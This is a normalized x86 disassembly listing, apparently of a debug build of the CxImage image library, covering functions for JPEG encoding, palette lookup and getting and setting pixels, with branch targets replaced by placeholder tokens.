cmp [ eax + 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
sub edx 0x14
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx [ ecx + 0x18 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
add ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
sub ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sub ecx [ eax + 0x18 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4159f0
add esp 0x4
jmp r-xdata
sub_415ba0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
lea edi [ ebp - 0x40 ]
mov ecx 0x10
mov eax 0xcccccccc
[ edi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415bc0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x14 ]
call ?GetHeight@CxImage@@QBEKXZ
sub eax 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
call ?GetBits@CxImage@@QAEPAEK@Z
mov esi eax
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x14 ]
call ?GetEffWidth@CxImage@@QBEKXZ
mov edi eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x14 ]
call ?GetHeight@CxImage@@QBEKXZ
sub eax 0x1
imul edi eax
add esi edi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] esi
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
sub_415c40
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x14 ]
call ?GetEffWidth@CxImage@@QBEKXZ
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
sub ecx eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] ecx
mov eax 0x1
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
sub_415cb0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x14 ]
call ?GetEffWidth@CxImage@@QBEKXZ
cmp [ ebp + 0xc ] eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
call ?GetEffWidth@CxImage@@QBEKXZ
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
call ?GetEffWidth@CxImage@@QBEKXZ
mov [ ebp - 0x8 ] eax
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0xc ] ecx
?GetHeight@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415d80
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov esi esp
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
call [ edx + 0xc ]
add esp 0x8
cmp esi esp
call _chkesp
mov esi esp
push 0x1
mov eax [ ebp - 0x4 ]
add eax 0x84
push eax
call [ longjmp@IAT ]
cmp esi esp
call _chkesp
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?Encode@CxImageJPG@@QAE_NPAVCxFile@@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434dac
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2d4
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x2e0 ]
mov ecx 0xb5
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
call ?EncodeSafeCheck@CxImage@@IAE_NPAVCxFile@@@Z
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x28 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x44
mov [ ebp - 0x17c ] eax
lea ecx [ ebp - 0x240 ]
push ecx
call sub_41aaf0
add esp 0x4
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x240 ] sub_415d80
lea edx [ ebp - 0x1bc ]
push r--data
mov eax [ ebp - 0x4 ]
push eax
push __CxxLongjmpUnwind
push 0x3
push edx
call _setjmp3
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
call ?IsGrayScale@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x168
push 0x3e
lea ecx [ ebp - 0x178 ]
push ecx
call sub_41dbb0
add esp 0xc
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x284 ]
call sub_4156c0
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x284 ]
mov [ ebp - 0x160 ] eax
mov ecx [ ebp - 0x10 ]
call ?GetWidth@CxImage@@QBEKXZ
mov [ ebp - 0x15c ] eax
mov ecx [ ebp - 0x10 ]
call ?GetHeight@CxImage@@QBEKXZ
mov [ ebp - 0x158 ] eax
mov ecx [ ebp - 0x10 ]
call ?IsGrayScale@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp - 0x17c ]
push ecx
mov edx [ ebp - 0x10 ]
add edx 0x44
push edx
call strcpy
add esp 0x8
lea eax [ ebp - 0x178 ]
push eax
call sub_419580
add esp 0x4
xor al al
jmp r-xdata
push r--data
mov edx [ ebp - 0x10 ]
add edx 0x44
push edx
call strcpy
add esp 0x8
xor al al
jmp r-xdata
mov [ ebp - 0x154 ] 0x3
mov [ ebp - 0x150 ] 0x2
mov [ ebp - 0x154 ] 0x1
mov [ ebp - 0x150 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x10 ]
call ?GetCodecOption@CxImage@@QBEKXZ
and eax 0x40
test eax eax
je r-xdata
push 0x1
lea edx [ ebp - 0x178 ]
push edx
call sub_41e730
add esp 0x8
lea ecx [ ebp - 0x178 ]
push ecx
call sub_41e380
add esp 0x4
mov ecx [ ebp - 0x10 ]
call ?GetCodecOption@CxImage@@QBEKXZ
and eax 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
call ?GetCodecOption@CxImage@@QBEKXZ
and eax 0x1
neg eax
sbb eax eax
neg eax
push eax
mov ecx [ ebp - 0x10 ]
call ?GetJpegQuality@CxImage@@QBEEXZ
and eax 0xff
push eax
lea edx [ ebp - 0x178 ]
push edx
call sub_41e340
add esp 0xc
mov [ ebp - 0xb1 ] 0x1
mov ecx [ ebp - 0x10 ]
call ?GetXDPI@CxImage@@QBEJXZ
mov [ ebp - 0xb0 ] ax
mov ecx [ ebp - 0x10 ]
call ?GetYDPI@CxImage@@QBEJXZ
mov [ ebp - 0xae ] ax
push 0x1
lea eax [ ebp - 0x178 ]
push eax
call sub_41df80
add esp 0x8
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x30 ]
mov [ ebp - 0x244 ] edx
mov esi esp
push 0x1
mov eax [ ebp - 0x244 ]
add eax 0x8
push eax
push 0x1
lea ecx [ ebp - 0x178 ]
push ecx
mov edx [ ebp - 0x174 ]
call [ edx + 0x8 ]
add esp 0x10
cmp esi esp
call _chkesp
mov [ ebp - 0x248 ] eax
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x29c ]
call sub_40fc00
lea ecx [ ebp - 0x29c ]
call sub_415bc0
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x668 ]
mov [ ebp - 0xc4 ] ecx
lea edx [ ebp - 0x178 ]
push edx
call sub_41dde0
add esp 0x4
lea eax [ ebp - 0x178 ]
push eax
call sub_419580
add esp 0x4
mov [ ebp - 0x2a0 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x284 ]
call sub_415780
mov al [ ebp - 0x2a0 ]
mov edx [ ebp - 0x244 ]
push edx
mov eax [ ebp - 0x248 ]
mov ecx [ eax ]
push ecx
lea ecx [ ebp - 0x29c ]
call sub_416150
mov edx [ ebp - 0x10 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x29c ]
call sub_415c40
push 0x1
mov eax [ ebp - 0x248 ]
push eax
lea ecx [ ebp - 0x178 ]
push ecx
call sub_41e040
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x244 ]
push eax
mov ecx [ ebp - 0x248 ]
mov edx [ ecx ]
push edx
mov ecx [ ebp - 0x10 ]
call ?RGBtoBGR@CxImage@@IAEXPAEH@Z
mov ecx [ ebp - 0xa8 ]
cmp ecx [ ebp - 0x158 ]
jae r-xdata
sub_416150
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call memcpy
add esp 0xc
?GetPaletteSize@CxImage@@QAEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
shl eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
add eax 0x28
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetPaletteColor@CxImage@@QAE?AUtagRGBQUAD@@E@Z
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x50 ]
mov ecx 0x14
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x7 ] 0x0
mov [ ebp - 0x6 ] 0x0
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
add eax 0x28
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0xc ]
and ecx 0xff
mov edx [ ebp - 0x4 ]
cmp ecx [ edx + 0x28 ]
jae r-xdata
mov eax [ ebp + 0xc ]
and eax 0xff
shl eax 0x2
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x10 ]
mov dl [ ecx ]
mov [ ebp - 0x8 ] dl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x10 ]
mov dl [ ecx ]
mov [ ebp - 0x7 ] dl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x10 ]
mov dl [ ecx ]
mov [ ebp - 0x6 ] dl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x10 ]
mov dl [ ecx ]
mov [ ebp - 0x5 ] dl
?GetPixelIndex@CxImage@@QAEEJJ@Z
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
mov al [ eax ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov al [ ecx + 0x14c ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx [ ecx + 0x10 ]
jl r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dx [ ecx + 0x16 ]
cmp edx 0x8
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
imul edx [ ecx + 0x30 ]
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cx [ eax + 0x16 ]
mov eax [ ebp + 0x8 ]
imul eax ecx
sar eax 0x3
add edx eax
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x34 ]
mov cl [ eax + edx ]
mov [ ebp - 0xc ] cl
mov edx [ ebp - 0x4 ]
xor eax eax
mov ax [ edx + 0x16 ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
imul ecx [ eax + 0x30 ]
add ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
mov al [ eax + ecx ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
xor eax eax
mov ax [ edx + 0x16 ]
cmp eax 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
and ecx 0x80000001
jns r-xdata
xor al al
mov ecx [ ebp + 0x8 ]
and ecx 0x80000007
jns r-xdata
mov edx 0x1
sub edx ecx
shl edx 0x2
mov [ ebp - 0x8 ] dl
mov ecx [ ebp - 0x8 ]
and ecx 0xff
mov eax 0xf
shl eax cl
mov cl [ ebp - 0xc ]
and cl al
mov [ ebp - 0xc ] cl
mov eax [ ebp - 0xc ]
and eax 0xff
mov ecx [ ebp - 0x8 ]
and ecx 0xff
sar eax cl
jmp r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
mov edx 0x7
sub edx ecx
mov [ ebp - 0x8 ] dl
mov ecx [ ebp - 0x8 ]
and ecx 0xff
mov eax 0x1
shl eax cl
mov cl [ ebp - 0xc ]
and cl al
mov [ ebp - 0xc ] cl
mov eax [ ebp - 0xc ]
and eax 0xff
mov ecx [ ebp - 0x8 ]
and ecx 0xff
sar eax cl
jmp r-xdata
dec ecx
or ecx 0xfffffff8
inc ecx
?GetPixelColor@CxImage@@QAE?AUtagRGBQUAD@@JJ_N@Z
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x58 ]
mov ecx 0x16
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x150 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14c ] 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
xor eax eax
mov ax [ edx + 0x16 ]
cmp eax 0x18
jge r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
jmp r-xdata
push 0x1
push 0x0
push 0x0
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPixelColor@CxImage@@QAE?AUtagRGBQUAD@@JJ_N@Z
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x150 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + 0x14c ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?GetPaletteColor@CxImage@@QAE?AUtagRGBQUAD@@E@Z
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax + 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
add esp 0x58
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
cmp eax [ edx + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
imul eax [ edx + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
add edx eax
mov eax [ ebp + 0xc ]
imul eax eax 0x3
add edx eax
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x8 ] dl
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x7 ] dl
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x6 ] dl
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?GetPaletteColor@CxImage@@QAE?AUtagRGBQUAD@@E@Z
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call ?AlphaGet@CxImage@@QAEEJJ@Z
mov [ ebp - 0x5 ] al
?SetPixelIndex@CxImage@@QAEXJJE@Z
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx [ ecx + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cx [ eax + 0x16 ]
cmp ecx 0x8
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
imul eax [ edx + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
add edx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cx [ eax + 0x16 ]
mov eax [ ebp + 0x8 ]
imul eax ecx
sar eax 0x3
add edx eax
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dx [ ecx + 0x16 ]
cmp edx 0x4
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
imul eax [ edx + 0x30 ]
add eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
mov cl [ ebp + 0x10 ]
mov [ edx + eax ] cl
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dx [ ecx + 0x16 ]
cmp edx 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x80000001
jns r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x80000007
jns r-xdata
mov ecx 0x1
sub ecx eax
shl ecx 0x2
mov [ ebp - 0x8 ] cl
mov ecx [ ebp - 0x8 ]
and ecx 0xff
mov edx 0xf
shl edx cl
not edx
mov eax [ ebp - 0xc ]
mov cl [ eax ]
and cl dl
mov edx [ ebp - 0xc ]
mov [ edx ] cl
mov eax [ ebp + 0x10 ]
and eax 0xff
and eax 0xf
mov ecx [ ebp - 0x8 ]
and ecx 0xff
shl eax cl
mov ecx [ ebp - 0xc ]
mov dl [ ecx ]
or dl al
mov eax [ ebp - 0xc ]
mov [ eax ] dl
jmp r-xdata
dec eax
or eax 0xfffffffe
inc eax
mov ecx 0x7
sub ecx eax
mov [ ebp - 0x8 ] cl
mov ecx [ ebp - 0x8 ]
and ecx 0xff
mov edx 0x1
shl edx cl
not edx
mov eax [ ebp - 0xc ]
mov cl [ eax ]
and cl dl
mov edx [ ebp - 0xc ]
mov [ edx ] cl
mov eax [ ebp + 0x10 ]
and eax 0xff
and eax 0x1
mov ecx [ ebp - 0x8 ]
and ecx 0xff
shl eax cl
mov ecx [ ebp - 0xc ]
mov dl [ ecx ]
or dl al
mov eax [ ebp - 0xc ]
mov [ eax ] dl
dec eax
or eax 0xfffffff8
inc eax
?SetPixelColor@CxImage@@QAEXJJK@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?RGBtoRGBQUAD@CxImage@@QAE?AUtagRGBQUAD@@K@Z
mov edx [ eax ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?SetPixelColor@CxImage@@QAEXJJUtagRGBQUAD@@_N@Z
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
?SetPixelColor@CxImage@@QAEXJJUtagRGBQUAD@@_N@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax + 0x10 ]
jl r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
imul ecx [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
add eax ecx
mov ecx [ ebp + 0x8 ]
imul ecx ecx 0x3
add eax ecx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov al [ ebp + 0x10 ]
mov [ edx ] al
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov al [ ebp + 0x11 ]
mov [ edx ] al
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov al [ ebp + 0x12 ]
mov [ edx ] al
mov ecx [ ebp + 0x14 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?GetNearestIndex@CxImage@@QAEEUtagRGBQUAD@@@Z
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?SetPixelIndex@CxImage@@QAEXJJE@Z
jmp r-xdata
mov dl [ ebp + 0x13 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?AlphaSet@CxImage@@QAEXJJE@Z
?GetNearestIndex@CxImage@@QAEEUtagRGBQUAD@@@Z
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x64 ]
mov ecx 0x19
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
